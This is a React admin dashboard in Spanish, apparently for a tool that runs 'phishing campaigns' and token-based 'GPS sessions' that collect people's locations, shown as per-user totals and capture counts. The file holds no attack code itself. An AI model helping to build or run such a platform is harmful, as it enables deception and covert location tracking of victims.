import { AppLayout } from "@/components/layout/AppLayout";
import { useEffect, useState } from "react";
import { Users, MapPin, Target, Shield, Clock, ChevronDown, ChevronUp } from "lucide-react";
import { auth } from "@/lib/firebase";

const API = "/api";

interface UserData {
  uid: string;
  email: string;
  lastActivity: string | null;
  sessions: Array<{
    id: number;
    token: string;
    name: string;
    captureCount: number;
    createdAt: string;
    ownerEmail?: string;
  }>;
  campaigns: Array<{
    id: number;
    name: string;
    status: string;
    captureCount: number;
    createdAt: string;
  }>;
}

interface Overview {
  totals: {
    users: number;
    sessions: number;
    campaigns: number;
    capturedLocations: number;
  };
  users: UserData[];
}

async function authHeaders() {
  const token = await auth.currentUser?.getIdToken();
  return token ? { Authorization: `Bearer ${token}` } : {};
}

function UserRow({ user }: { user: UserData }) {
  const [open, setOpen] = useState(false);
  const initial = user.email?.[0]?.toUpperCase() ?? "?";

  return (
    <div className="border border-border rounded-lg overflow-hidden">
      <button
        onClick={() => setOpen(!open)}
        className="w-full flex items-center gap-3 p-4 text-left hover:bg-secondary/30 transition-colors"
      >
        <div className="w-9 h-9 rounded-full bg-primary/15 border border-primary/20 flex items-center justify-center shrink-0">
          <span className="font-mono text-sm text-primary font-bold">{initial}</span>
        </div>
        <div className="flex-1 min-w-0">
          <p className="font-medium text-foreground truncate">{user.email || user.uid || "Sin email"}</p>
          <p className="text-xs text-muted-foreground mt-0.5">
            {user.sessions.length} sesiones GPS · {user.campaigns.length} campañas
            {user.lastActivity && (
              <> · Última actividad: {new Date(user.lastActivity).toLocaleDateString("es-MX")}</>
            )}
          </p>
        </div>
        <div className="flex items-center gap-3 shrink-0">
          <span className="hidden sm:flex items-center gap-1 text-xs text-muted-foreground bg-secondary px-2 py-1 rounded">
            <MapPin className="w-3 h-3" />
            {user.sessions.reduce((a, s) => a + s.captureCount, 0)} ubicaciones
          </span>
          {open ? <ChevronUp className="w-4 h-4 text-muted-foreground" /> : <ChevronDown className="w-4 h-4 text-muted-foreground" />}
        </div>
      </button>

      {open && (
        <div className="border-t border-border bg-secondary/10 p-4 space-y-4">
          {user.sessions.length > 0 && (
            <div>
              <p className="text-xs font-semibold text-muted-foreground uppercase tracking-wider mb-2 flex items-center gap-1.5">
                <MapPin className="w-3.5 h-3.5" /> Sesiones GPS
              </p>
              <div className="space-y-1.5">
                {user.sessions.map(s => (
                  <div key={s.id} className="flex items-center justify-between px-3 py-2 bg-card rounded border border-border text-sm">
                    <span className="font-medium text-foreground">{s.name}</span>
                    <div className="flex items-center gap-3 text-xs text-muted-foreground">
                      <span className="text-primary font-mono">{s.captureCount} ubicaciones</span>
                      <span>{new Date(s.createdAt).toLocaleDateString("es-MX")}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {user.campaigns.length > 0 && (
            <div>
              <p className="text-xs font-semibold text-muted-foreground uppercase tracking-wider mb-2 flex items-center gap-1.5">
                <Target className="w-3.5 h-3.5" /> Campañas de phishing
              </p>
              <div className="space-y-1.5">
                {user.campaigns.map(c => (
                  <div key={c.id} className="flex items-center justify-between px-3 py-2 bg-card rounded border border-border text-sm">
                    <span className="font-medium text-foreground">{c.name}</span>
                    <div className="flex items-center gap-3 text-xs text-muted-foreground">
                      <span className={
                        c.status === "active" ? "text-green-400" :
                        c.status === "stopped" ? "text-red-400" : "text-yellow-400"
                      }>{c.status}</span>
                      <span className="text-primary font-mono">{c.captureCount} caps</span>
                      <span>{new Date(c.createdAt).toLocaleDateString("es-MX")}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {user.sessions.length === 0 && user.campaigns.length === 0 && (
            <p className="text-sm text-muted-foreground text-center py-2">Sin actividad registrada</p>
          )}
        </div>
      )}
    </div>
  );
}

export default function AdminPage() {
  const [overview, setOverview] = useState<Overview | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  async function load() {
    setLoading(true);
    setError("");
    try {
      const headers = await authHeaders();
      const res = await fetch(`${API}/admin/overview`, { headers });
      if (res.status === 403) { setError("Acceso denegado. Solo el administrador puede ver este panel."); return; }
      const data = await res.json();
      setOverview(data);
    } catch {
      setError("Error al cargar el panel administrativo.");
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => { load(); }, []);

  return (
    <AppLayout>
      <div className="space-y-6">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center">
            <Shield className="w-5 h-5 text-primary" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-foreground">Panel Administrativo</h1>
            <p className="text-sm text-muted-foreground">Vista global de todos los usuarios y su actividad</p>
          </div>
        </div>

        {loading && (
          <div className="flex items-center justify-center py-20">
            <div className="w-8 h-8 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
          </div>
        )}

        {error && (
          <div className="bg-destructive/10 border border-destructive/30 rounded-lg p-4 text-sm text-destructive">
            {error}
          </div>
        )}

        {overview && (
          <>
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
              {[
                { label: "Usuarios", value: overview.totals.users, icon: Users, color: "text-blue-400" },
                { label: "Sesiones GPS", value: overview.totals.sessions, icon: MapPin, color: "text-green-400" },
                { label: "Campañas", value: overview.totals.campaigns, icon: Target, color: "text-yellow-400" },
                { label: "Ubicaciones", value: overview.totals.capturedLocations, icon: Clock, color: "text-primary" },
              ].map(({ label, value, icon: Icon, color }) => (
                <div key={label} className="bg-card border border-border rounded-lg p-4">
                  <div className="flex items-center gap-2 mb-1">
                    <Icon className={`w-4 h-4 ${color}`} />
                    <span className="text-xs text-muted-foreground">{label}</span>
                  </div>
                  <p className="text-2xl font-bold text-foreground">{value}</p>
                </div>
              ))}
            </div>

            <div>
              <h2 className="text-sm font-semibold text-muted-foreground uppercase tracking-wider mb-3">
                Usuarios ({overview.users.length})
              </h2>
              {overview.users.length === 0 ? (
                <div className="text-center py-10 text-muted-foreground text-sm">
                  Aún no hay actividad de usuarios
                </div>
              ) : (
                <div className="space-y-3">
                  {overview.users.map((u, i) => (
                    <UserRow key={u.uid || u.email || i} user={u} />
                  ))}
                </div>
              )}
            </div>
          </>
        )}
      </div>
    </AppLayout>
  );
}
